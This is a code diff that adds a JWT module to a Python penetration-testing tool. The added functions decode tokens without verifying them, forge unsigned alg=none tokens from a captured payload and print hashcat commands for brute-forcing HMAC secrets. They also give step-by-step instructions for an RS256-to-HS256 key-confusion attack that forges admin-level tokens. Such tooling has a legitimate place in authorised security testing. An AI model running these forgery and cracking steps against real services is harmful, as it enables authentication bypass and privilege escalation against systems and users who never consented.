@@ -1,4 +1,4 @@
-import argparse, requests, time, re, warnings, tldextract, urllib3, os, difflib, logging, random, threading, signal, sys, subprocess, shlex, pprint, http.client, json, textwrap
+import argparse, requests, time, re, warnings, tldextract, urllib3, os, difflib, logging, random, threading, signal, sys, subprocess, shlex, pprint, http.client, json, textwrap, jwt, base64
 import concurrent.futures
 from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
 from urllib.parse import urlparse, urljoin, parse_qs, parse_qsl, urlencode, urlunparse, quote
@@ -7,6 +7,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from packaging.version import parse as parse_version, InvalidVersion
 from packaging import version
 from wappalyzer import analyze
+from datetime import datetime, timezone
 
 init() # Init colorama
 
@@ -3467,7 +3468,123 @@ def check_traversal_paths(BASE_URL, method, cookies, max_threads):
     else:
         print(f"{R}[!] No files were found matching known traversal paths.\n")
     
-    
+
+
+###############################################################################################################
+################################################### JWT TOKEN #################################################
+###############################################################################################################
+
+def base64url_encode(data):
+    """Base64 URL-safe encoding without padding '='."""
+    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip("=")
+
+def decode_jwt(token):
+    """Decode a JWT without verifying the signature."""
+    try:
+        now = datetime.now(timezone.utc)
+        header = jwt.get_unverified_header(token)
+        payload = jwt.decode(token, options={"verify_signature": False})
+        
+        print(f"{C}=== Header ==={G}")
+        print(json.dumps(header, indent=4))
+        print(f"\n{C}=== Payload ==={G}")
+        print(json.dumps(payload, indent=4))
+
+        # Expiration time
+        if "exp" in payload:
+            exp_time = datetime.fromtimestamp(payload["exp"], tz=timezone.utc)
+            remaining = exp_time - now
+            print(f"\n{G}[+] Token expiration : {exp_time} UTC ({Y}time remaining : {R}{remaining}{G})")
+
+        # Issued at time
+        if "iat" in payload:
+            iat_time = datetime.fromtimestamp(payload["iat"], tz=timezone.utc)
+            age = now - iat_time
+            print(f"{G}[+] Token issued at : {iat_time} UTC ({Y}age : {R}{age}{G})")
+
+        # Optional standard JWT fields
+        for field in ["iss", "aud", "sub", "name", "admin"]:
+            if field in payload:
+                print(f"{Y}[!] {G}{field} : {payload[field]}")
+
+        return header, payload
+
+    except jwt.DecodeError as e:
+        print(f"{R}JWT decoding error : {e}")
+        return None, None
+
+def create_alg_none_token(original_payload):
+    """Create a vulnerable token with alg=none based on an existing payload."""
+    header_none = {
+        "typ": "JWT",
+        "alg": "none"
+    }
+
+    # Base64url encoding
+    header_b64 = base64url_encode(json.dumps(header_none).encode())
+    payload_b64 = base64url_encode(json.dumps(original_payload).encode())
+
+    # No signature → token ends with a trailing period
+    return f"{header_b64}.{payload_b64}."
+
+def check_vulnerabilities(header, payload, token):
+    """Check for common JWT vulnerabilities and suggest brute-force options."""
+    vulnerabilities = []
+    hashcat_bruteforce = []
+    jwt_none = []
+
+    hashcat_wordlist = None
+    now_ts = datetime.now(timezone.utc).timestamp()
+
+    alg = header.get("alg", "").upper()
+
+    # 1. alg=None vulnerability
+    if alg == "NONE":
+        vulnerabilities.append("JWT vulnerable: alg=None (signature bypass possible) [CVE-2018-1000531]")
+
+    # 2. HMAC brute-force possible
+    if alg in ["HS256", "HS384", "HS512"]:
+        vulnerabilities.append(f"{G}- JWT uses HMAC ({R}{alg}{G})")
+        vulnerabilities.append(f"{G}--> Check if the HMAC key is weak or guessable ({R}Hashcat attacks{G})")
+
+        # Suggested Hashcat commands (CPU/GPU brute-force)
+        hashcat_bruteforce.append(f"{G}[+] a - z | A - Z | 0 - 9 | Special chars \n{Y}hashcat -m 16500 -a 3 {token} ?a?a?a?a?a?a?a?a")
+        hashcat_bruteforce.append(f"{G}[+] a - z | A - Z | 0 - 9 \n{Y}hashcat -m 16500 -a 3 -1 ?l?u?d {token} ?1?1?1?1?1?1?1?1")
+        hashcat_bruteforce.append(f"{G}[+] a - z | A - Z \n{Y}hashcat -m 16500 -a 3 {token} ?l?u?l?u?l?u?l?u?l?u?l?u?l?u?l?u")
+        hashcat_bruteforce.append(f"{G}[+] a - z | 0 - 9 \n{Y}hashcat -m 16500 -a 3 -1 ?l?d {token} ?l?l?l?l?l?l?l?l")
+        hashcat_bruteforce.append(f"{G}[+] a - z  \n{Y}hashcat -m 16500 -a 3 {token} ?1?1?1?1?1?1?1?1")
+        hashcat_bruteforce.append(f"{G}[+] Wordlist \n{Y}hashcat -m 16500 -a 0 {token} wordlist.txt")
+
+        jwt_none.append(f"\n{G}[+] Generate a vulnerable token with {R}alg=none{Y}")
+        jwt_none.append(create_alg_none_token(payload))
+
+    # 3. Algorithm confusion (RS256 → HS256)
+    if alg.startswith("RS"):
+        vulnerabilities.append(f"{G}- JWT uses an asymmetric algorithm ({R}{alg}{G})")
+        vulnerabilities.append(f"{G}- Potential key confusion attack {R}: the token is signed with RS256 but could be verified using HMAC")
+        vulnerabilities.append(f"{G}--> Step 1 : Locate the server's public key ({R}.well-known/jwks.json{G}) or equivalent endpoint")
+        vulnerabilities.append(f"{G}--> Step 2 : Modify the JWT header to {R}HS256{G} instead of RS256")
+        vulnerabilities.append(f"{G}--> Step 3 : Craft your payload {R}with elevated privileges{G} (e.g., role=admin)")
+        vulnerabilities.append(f"{G}--> Step 4 : Sign the forged JWT using the server's public key {R}as the HMAC secret{G}")
+        vulnerabilities.append(f"{G}--> Step 5 : Send the forged token to the server and check if elevated access is granted")
+
+
+    # 4. Expiration
+    if "exp" in payload and now_ts > payload["exp"]:
+        vulnerabilities.append(f"{G}- JWT is {R}expired")
+    elif "exp" not in payload:
+        vulnerabilities.append(f"{G}- JWT has no expiration ({R}exp field missing{G})")
+
+    # 5. Token age
+    if "iat" in payload:
+        age_seconds = now_ts - payload["iat"]
+        if age_seconds > 365 * 24 * 3600:
+            vulnerabilities.append(f"{G}- JWT was issued over a year ago ({R}potentially risky{G})")
+
+    return vulnerabilities, hashcat_bruteforce, jwt_none
+
+
+
     
 ###############################################################################################################
 ################################################### main menu #################################################
@@ -3481,6 +3598,7 @@ def main():
     
     parser = argparse.ArgumentParser(description="Advanced Bug Hunting and Pentest Tool")
     parser.add_argument("-hh", "--help_verbose", action="store_true", help="Show advenced help mode (Default modes on dalfox, nuclei and sqlmap without parameters, dalfox help menu, nuclei help menu and sqlmap help menu)")
+    parser.add_argument("--jwt", help="Check JWT Bearer Token : --jwt <JWT_Token>")
     parser.add_argument("-u", "--url", help="Target URL to scan")
     parser.add_argument("-f", "--file", help="Load urls from file (works with --traversal --open-redirect and --crlf)")
     parser.add_argument("--cookies", default="", help="Set custom cookies (format: key1=value1; key2=value2)'")
@@ -3537,9 +3655,31 @@ def main():
             
         check_ips(lanch)
 
+    
+    if args.jwt:
+        header, payload = decode_jwt(args.jwt)
+        if header and payload:
+            vulns, hashcat_bruteforce, jwt_none = check_vulnerabilities(header, payload, args.jwt)
+            if vulns:
+                print(f"\n{C}=== Vulnerabilities detected ==={G}")
+                for v in vulns:
+                    print(f"{v}")
+            else:
+                print(f"\n{M}[-] No obvious vulnerabilities detected")
 
-    if not (args.url or args.file):
-        parser.error("You must specify your search query")
+            if jwt_none:
+                for token in jwt_none:
+                    print(token)
+
+            if hashcat_bruteforce:
+                print(f"\n{Y}[!] Suggested Hashcat commands for brute-force or dictionary attack")
+                for cmd in hashcat_bruteforce:
+                    print(cmd)
+        
+    if not args.jwt:
+        if not (args.url or args.file):
+            parser.error("You must specify your search query")
+
 
     if args.url and args.file:
         parser.error("You cannot specify both --url and --file at the same time")
